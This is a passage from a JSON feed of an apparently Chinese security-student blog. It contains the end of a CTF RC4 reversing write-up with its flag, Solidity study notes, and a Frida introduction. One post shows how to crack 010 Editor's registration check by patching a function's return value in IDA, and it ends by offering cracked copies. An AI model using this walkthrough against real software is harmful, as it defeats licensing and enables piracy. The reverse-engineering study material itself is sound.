punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">37</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">12</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">38</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">72</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">39</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">55</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">40</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">11</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">41</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">44</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">42</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">11</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">43</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">88</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> datalen <span class=\"token operator\">=</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">;</span> <span class=\"token comment\">// 减去末尾的 '\\0'</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>    <span class=\"token function\">rc4</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span> keylen<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">,</span> datalen<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"加密后：\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> datalen<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%02X \"</span><span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>    <span class=\"token comment\">//rc4(key, keylen, data, datalen);</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n解密后：%s\"</span><span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>最后觉得下次 其实可直接复制 IDA 的 TAT</p>\n<p>DASCTF {03446c2c-dff7-11ed-9285-54e1ad98d649} 泪目</p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "笔记"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/06/18/%E7%A0%B4%E8%A7%A3010Editor/",
            "url": "https://3cly.github.io/2023/06/18/%E7%A0%B4%E8%A7%A3010Editor/",
            "title": "破解010Editor",
            "date_published": "2023-06-18T07:29:00.000Z",
            "content_html": "<h1 id=\"破解010editor\"><a class=\"markdownIt-Anchor\" href=\"#破解010editor\">#</a> 破解 010Editor</h1>\n<p>全程在虚拟机上操作 (因为不想卸载物理机上的 010)</p>\n<h2 id=\"先官网下载安装\"><a class=\"markdownIt-Anchor\" href=\"#先官网下载安装\">#</a> 先官网下载安装</h2>\n<p><img data-src=\"/images/image-20230618142557527.png\" alt=\"image-20230618142557527\"></p>\n<p><img data-src=\"/images/image-20230618144543522.png\" alt=\"image-20230618144543522\"></p>\n<h2 id=\"行为分析\"><a class=\"markdownIt-Anchor\" href=\"#行为分析\">#</a> 行为分析</h2>\n<p>安装完有 30 试用 &amp;&amp; 需要注册</p>\n<p><img data-src=\"/images/image-20230618144815615.png\" alt=\"image-20230618144815615\"></p>\n<p>瞎 JB 填一通 提示错误</p>\n<p><img data-src=\"/images/image-20230618145014404.png\" alt=\"image-20230618145014404\"></p>\n<h2 id=\"ida查看\"><a class=\"markdownIt-Anchor\" href=\"#ida查看\">#</a> IDA 查看</h2>\n<p><img data-src=\"/images/image-20230618145940700.png\" alt=\"image-20230618145940700\"></p>\n<p>直接对 Invalid name 字符串进行一个查找 再 X 交叉引用</p>\n<p><img data-src=\"/images/image-20230618150056848.png\" alt=\"image-20230618150056848\"></p>\n<p><img data-src=\"/images/image-20230618150240944.png\" alt=\"image-20230618150240944\"></p>\n<p>else 很明显 这部分都是不同的错误所对应的报错 向上找到 if 注册正确</p>\n<p><img data-src=\"/images/image-20230618150547666.png\" alt=\"image-20230618150547666\"></p>\n<p>v26==219 是关键 那关键就是函数 sub_140008693</p>\n<p><img data-src=\"/images/image-20230618150722583.png\" alt=\"image-20230618150722583\"></p>\n<p><img data-src=\"/images/image-20230618150917027.png\" alt=\"image-20230618150917027\"></p>\n<p>这个结构 就直接 ptach 修改就行了 这里我的思路是让他 return <s>v11 然后 v11</s> 的值是 219</p>\n<p><img data-src=\"/images/image-20230618151942617.png\" alt=\"image-20230618151942617\"></p>\n<p><img data-src=\"/images/image-20230618152002418.png\" alt=\"image-20230618152002418\"></p>\n<p>这下直接 219 了</p>\n<p><img data-src=\"/images/image-20230618152107546.png\" alt=\"image-20230618152107546\"></p>\n<p>Edit-&gt; 应用 patch</p>\n<p><img data-src=\"/images/image-20230618152202785.png\" alt=\"image-20230618152202785\"></p>\n<p>成功</p>\n<h2 id=\"破解成功\"><a class=\"markdownIt-Anchor\" href=\"#破解成功\">#</a> 破解成功！！！</h2>\n<p>直接注册码瞎输一通 直接通过！</p>\n<p><img data-src=\"/images/image-20230618152538959.png\" alt=\"image-20230618152538959\"></p>\n<h2 id=\"感想\"><a class=\"markdownIt-Anchor\" href=\"#感想\">#</a> 感想</h2>\n<p>太简单了 有手就行 想要 010Editor 破解版直接加我 QQ987623364</p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "笔记"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/05/28/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF%E4%B8%8E%E7%A0%94%E7%A9%B6%E8%BF%9B%E5%B1%95/",
            "url": "https://3cly.github.io/2023/05/28/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF%E4%B8%8E%E7%A0%94%E7%A9%B6%E8%BF%9B%E5%B1%95/",
            "title": "区块链技术与研究进展",
            "date_published": "2023-05-28T00:20:24.000Z",
            "content_html": "<h1 id=\"区块链技术与研究进展\"><a class=\"markdownIt-Anchor\" href=\"#区块链技术与研究进展\">#</a> 区块链技术与研究进展</h1>\n<p><strong>区块链智能合约的优点</strong>：去中心化 多方验证 难以篡改</p>\n<h2 id=\"solidity语言\"><a class=\"markdownIt-Anchor\" href=\"#solidity语言\">#</a> <strong>Solidity 语言</strong></h2>\n<p>Solidity 是一种用于实现智能合约的面向对象的高级语言。Solidity 语法接近于 JavaScript，且是目前较为成熟、流行的智能合约语言</p>\n<h3 id=\"特性\"><a class=\"markdownIt-Anchor\" href=\"#特性\">#</a> 特性</h3>\n<p>Solidity 在初期设计时的目标是为了编写以太坊上的智能合约，因此有部分语法与以太坊的工作原理是高度耦合的。Solidity 中具有一些特殊类型（如 address、event 等）Solidity 中具有一些特殊的关键字（如 payable、now 等）Solidity 需要结合以太坊智能合约的特性在编写过程中对变量进行具体存储位置的定义</p>\n<p>在线编译器：<span class=\"exturl\" data-url=\"aHR0cDovL3JlbWl4LmV0aGVyZXVtLm9yZy8lRTQlQjglQUQlRTYlOTYlODclRTYlOTYlODclRTYlQTElQTMlRUYlQkMlOUFodHRwczovL3NvbGlkaXR5LWNuLnJlYWR0aGVkb2NzLmlv\">http://remix.ethereum.org/ 中文文档：https://solidity-cn.readthedocs.io</span></p>\n<h3 id=\"基础语法\"><a class=\"markdownIt-Anchor\" href=\"#基础语法\">#</a> 基础语法</h3>\n<h4 id=\"常用类型\"><a class=\"markdownIt-Anchor\" href=\"#常用类型\">#</a> 常用类型</h4>\n<p><strong>布尔类型</strong>由 bool 声明，与传统编程语言类似，可取 true 或者 false。</p>\n<p><strong>整型</strong>由 int 声明有符号的整型变量，由 uint 声明无符号的整型变量，可取整数。声明变量时加上数字表示变量的位数，如 int8 表示 8 位长度的有符号整型变量，位数可取 8、16、……、256。未声明变量位数时，编译器在编译时将默认其为最长位数，即将 int 编译为 int256。</p>\n<p><strong>地址类型</strong>由 address 声明，指以太坊账户的地址类型，与以太坊账户长度相同，该类型实际为存储一个 20 字节的值。地址类型的变量将自带多个成员变量，可通过多个成员变量函数进行账号余额获取、跨账号的转账、调用等操作。</p>\n<p><strong>地址类型</strong>成员函数 balance：获取该地址余额，如<address>.balance (uint256)；transfer：向该地址转账，失败则抛出异常，如<address>.transfer (uint256 amount)；send：向该地址转账，失败则返回 false，如<address>.send (uint256 amount)；call/callcode/delegatecall：向该地址发出相应的底层合约调用消息，如<address>.call(…)</address></address></address></address></p>\n<p><strong>映射</strong>由 mapping (键类型 =&gt; 值类型) 声明键类型不可以是：映射、变长数组、合约、枚举以及结构体在映射对应的以太坊状态树底层存储中，实际上并不存储键的值，而是存储键的 keccak256 哈希值，从而便于减小存储体积的同时查询实际的值。与数组不同的是，映射没有长度。</p>\n<p><strong>结构体</strong>由 struct 声明，可将多个基本变量组合为一个结构</p>\n<p><strong>指定变量的访问</strong></p>\n<p>在声明变量时，在类型名后，可以指定变量为 public 或 private 变量是否可以被合约的外部调用获取查询</p>\n<p><strong>指定变量的存储位置</strong></p>\n<p>在声明变量时，在类型名后，可以指定变量的存储位置为 storage 或 memory 变量保存在存储或是内存中。同样变量的不同存储位置涉及 Gas 计费的不同。一般情况下，各个变量有默认的存储位置，当编译器无法默认识别时，会提示开发者进行修改。</p>\n<h5 id=\"例子\"><a class=\"markdownIt-Anchor\" href=\"#例子\">#</a> 例子</h5>\n<figure class=\"highlight solidity\"><figcaption data-lang=\"Solidity (Ethereum)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// SPDX-License-Identifier: MIT</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token number\">0.6</span><span class=\"token number\">.0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">contract</span> <span class=\"token class-name\">Test1</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">myStruct</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token builtin\">bool</span> myBool<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token builtin\">uint</span> myUint<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token builtin\">address</span> myAddress<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token builtin\">string</span> myString<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    myStruct<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">public</span> myArray<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">mapping</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token operator\">=></span><span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> myMapping<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        myStruct <span class=\"token keyword\">memory</span> myElement <span class=\"token operator\">=</span> <span class=\"token function\">myStruct</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span><span class=\"token string\">\"Hello\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        myArray<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>myElement<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        myMapping<span class=\"token punctuation\">[</span><span class=\"token number\">10086</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string\">\"World\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h6 id=\"测试\"><a class=\"markdownIt-Anchor\" href=\"#测试\">#</a> 测试</h6>\n<p><img data-src=\"/images/image-20230527132344158.png\" alt=\"image-20230527132344158\"></p>\n<h4 id=\"函数类型\"><a class=\"markdownIt-Anchor\" href=\"#函数类型\">#</a> 函数类型</h4>\n<p>函数的声明：在 Solidity 中，函数通过以下形式进行声明：</p>\n<p public|private|internal|external>function (参数)</p>\n<p>[pure|constant|view|payable] [returns (返回值)]</p>\n<p>[] 中的选项为可选的函数类型描述。</p>\n<h4 id=\"特殊变量\"><a class=\"markdownIt-Anchor\" href=\"#特殊变量\">#</a> 特殊变量</h4>\n<p><strong>特殊变量的由来</strong>以太坊虚拟机提供了获取部分区块链信息的操作码，在 Solidity 中，相对应地，也预设了一些特殊变量和函数在 Remix 编译器中可尝试得到各个变量的返回值</p>\n<p><strong>常用特殊变量</strong></p>\n<p>block.blockhash (区块号参数)：近 256 个区块哈希；</p>\n<p>block.coinbase: 合约交易所处区块的矿工地址；</p>\n<p>block.difficulty: 合约交易所处区块的挖矿难度；</p>\n<p>block.gaslimit: 合约交易所处区块的 gasLimit；</p>\n<p>block.number: 合约交易所处区块的高度；</p>\n<p>block.timestamp: 合约交易所处区块的时间戳；</p>\n<h4 id=\"事件日志\"><a class=\"markdownIt-Anchor\" href=\"#事件日志\">#</a> 事件日志</h4>\n<p><strong>以太坊事件树</strong></p>\n<p>以太坊采用了事件日志进行记录，有别于状态树，事件树是单向输出、不可被合约读取的事件树为上层应用提供了高效的查询方式，使得上层应用能够观察特定合约的特定动作的发生及其内容</p>\n<h4 id=\"错误处理\"><a class=\"markdownIt-Anchor\" href=\"#错误处理\">#</a> 错误处理</h4>\n<p><strong>背景</strong></p>\n<p>与传统计算机程序类似，以太坊智能合约的运行过程中，也可能出现由开发者定义的异常或错误，例如发起交易的地址不具有调用该函数的权限等。因此，需要对合约运行中的交易进行处理。</p>\n<p><strong>以太坊错误处理</strong></p>\n<p>在以太坊智能合约中，一般而言，交易在发生异常后，其交易修改的所有状态都将被回滚、都是无效的。</p>\n<p><strong>低级调用函数产生异常</strong></p>\n<p>通过 Solidity 提供的低级调用函数（call、delegatecall、callcode）进行合约子调用时若产生异常将返回 false，从而不会将子调用之外修改的状态回滚。</p>\n<p><strong>以太坊底层实现</strong></p>\n<p>以太坊通过记录状态根进行状态回滚，在发生异常时回到交易执行前的状态根、且不记录日志。</p>\n<p><strong>Solidity 错误处理函数</strong></p>\n<p>assert (条件参数)</p>\n<p>如果条件参数为 false，则使当前交易没有效果，并消耗交易剩余的 gas。</p>\n<p>require (条件参数，[消息参数])</p>\n<p>如果条件参数为 false，则撤销状态更改，并且，如果还传入了消息参数，则提供一个错误消息。</p>\n<p>revert ([消息参数])</p>\n<p>终止运行并撤销状态更改，如果还传入了消息参数，则提供一个错误消息。</p>\n<h3 id=\"私有链搭建\"><a class=\"markdownIt-Anchor\" href=\"#私有链搭建\">#</a> 私有链搭建</h3>\n<p>复习考试 等几天再补上</p>\n<h3 id=\"现在水龙头难搞测试币都领不到力\"><a class=\"markdownIt-Anchor\" href=\"#现在水龙头难搞测试币都领不到力\">#</a> 现在水龙头难搞，测试币都领不到力</h3>\n<p><img data-src=\"/images/image-20230523154742681.png\" alt=\"image-20230523154742681\"></p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "笔记"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/05/28/%E5%88%9D%E8%AF%86Frida/",
            "url": "https://3cly.github.io/2023/05/28/%E5%88%9D%E8%AF%86Frida/",
            "title": "初识Frida",
            "date_published": "2023-05-28T00:19:12.000Z",
            "content_html": "<h1 id=\"noobのfrida_study\"><a class=\"markdownIt-Anchor\" href=\"#noobのfrida_study\">#</a> noob の Frida_study</h1>\n<p>!! 一眼丁真 鉴定为我是一个纯纯的大摆子 学习不行要挂科 CTF 题做不来 只有睡觉才维持得了生活！！</p>\n<h2 id=\"搭建环境\"><a class=\"markdownIt-Anchor\" href=\"#搭建环境\">#</a> 搭建环境</h2>\n<p>mumu 模拟器搞的 QAQ</p>\n<p><img data-src=\"/images/image-20230420214437839.png\" alt=\"image-20230420214437839\"></p>\n<p>不行啊 Frida 过后在模拟器运行 APP 感觉还是有点小问题 得想办法搞一个真机先</p>\n<h3 id=\"真机测试\"><a class=\"markdownIt-Anchor\" href=\"#真机测试\">#</a> 真机测试</h3>\n<p><img data-src=\"/images/image-20230425233608122.png\" alt=\"image-20230425233608122\"></p>\n<h3 id=\"搭建frida开发环境\"><a class=\"markdownIt-Anchor\" href=\"#搭建frida开发环境\">#</a> 搭建 frida 开发环境</h3>\n<figure class=\"highlight js\"><figcaption data-lang=\"JavaScript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>git clone git<span class=\"token operator\">:</span><span class=\"token operator\">/</span><span class=\"token operator\">/</span>github<span class=\"token punctuation\">.</span>com<span class=\"token operator\">/</span>oleavr<span class=\"token operator\">/</span>frida<span class=\"token operator\">-</span>agent<span class=\"token operator\">-</span>example<span class=\"token punctuation\">.</span>git</pre></td></tr><tr><td data-num=\"2\"></td><td><pre> cd frida<span class=\"token operator\">-</span>agent<span class=\"token operator\">-</span>example<span class=\"token operator\">/</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> npm install</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> frida <span class=\"token operator\">-</span><span class=\"token constant\">U</span> <span class=\"token operator\">-</span>f com<span class=\"token punctuation\">.</span>example<span class=\"token punctuation\">.</span>android <span class=\"token operator\">--</span>no<span class=\"token operator\">-</span>pause <span class=\"token operator\">-</span>l _agent<span class=\"token punctuation\">.</span>js 这里我直接VScode了</pre></td></tr></table></figure><h3 id=\"frida常用命令\"><a class=\"markdownIt-Anchor\" href=\"#frida常用命令\">#</a> frida 常用命令</h3>\n<pre><code>frida-ls-devices # 列出所有设备\n\nfrida-ps -U # 列出usb设备的进程\n\nfrida-ps -Ua # 列出正在跑的应用\n\nfrida-ps -Uai # 列出所有安装的应用\n\nfrida-ps -D xxxxx # 连接指定的设备，设备id可以从第一条命令获得\n\n# 启动应用并注入脚本 后面会提到这两者的区别\nfrida -U -l exploit.js -f com.xxx.yyy\n\n# 应用已经在运行，注入脚本\nfrida -U -l exploit.js &quot;XXXX&quot;\n</code></pre>\n<h2 id=\"实践\"><a class=\"markdownIt-Anchor\" href=\"#实践\">#</a> 实践</h2>\n<h3 id=\"frida对函数的调用\"><a class=\"markdownIt-Anchor\" href=\"#frida对函数的调用\">#</a> Frida 对函数的调用</h3>\n<h3 id=\"frida_hook\"><a class=\"markdownIt-Anchor\" href=\"#frida_hook\">#</a> Frida_Hook</h3>\n<p>1.attach</p>\n<p><img data-src=\"/images/image-20230426230045546.png\" alt=\"image-20230426230045546\"></p>\n<p>对手机最前面的一个进程操作 (或者 frida -UF)</p>\n<p>或 frida -U -n 名字</p>\n<p>2.spawn</p>\n<p>frida -U -f (包名)</p>\n<h3 id=\"ctf题\"><a class=\"markdownIt-Anchor\" href=\"#ctf题\">#</a> CTF 题</h3>\n<p>学习在 java 层怎么使用 frida 实现：</p>\n<ol>\n<li>任意类方法调用。</li>\n<li>任意类方法重实现。</li>\n</ol>\n<h4 id=\"rps\"><a class=\"markdownIt-Anchor\" href=\"#rps\">#</a> rps</h4>\n<p>使用 jadx 反编译得到</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token keyword\">final</span> <span class=\"token class-name\">Runnable</span> showMessageTask <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Runnable</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>            <span class=\"token class-name\">TextView</span> tv3 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">TextView</span><span class=\"token punctuation\">)</span> <span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">findViewById</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">R</span><span class=\"token punctuation\">.</span>id<span class=\"token punctuation\">.</span>textView3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token class-name\">MainActivity</span> mainActivity<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>n <span class=\"token operator\">-</span> <span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>m <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>                mainActivity <span class=\"token operator\">=</span> <span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                mainActivity<span class=\"token punctuation\">.</span>cnt<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>                tv3<span class=\"token punctuation\">.</span><span class=\"token function\">setText</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"WIN! +\"</span> <span class=\"token operator\">+</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token function\">valueOf</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cnt<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>m <span class=\"token operator\">-</span> <span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>n <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>                <span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cnt <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                tv3<span class=\"token punctuation\">.</span><span class=\"token function\">setText</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"LOSE +0\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>m <span class=\"token operator\">==</span> <span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                tv3<span class=\"token punctuation\">.</span><span class=\"token function\">setText</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"DRAW +\"</span> <span class=\"token operator\">+</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token function\">valueOf</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cnt<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>m <span class=\"token operator\">&lt;</span> <span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                <span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cnt <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                tv3<span class=\"token punctuation\">.</span><span class=\"token function\">setText</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"LOSE +0\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                mainActivity <span class=\"token operator\">=</span> <span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                mainActivity<span 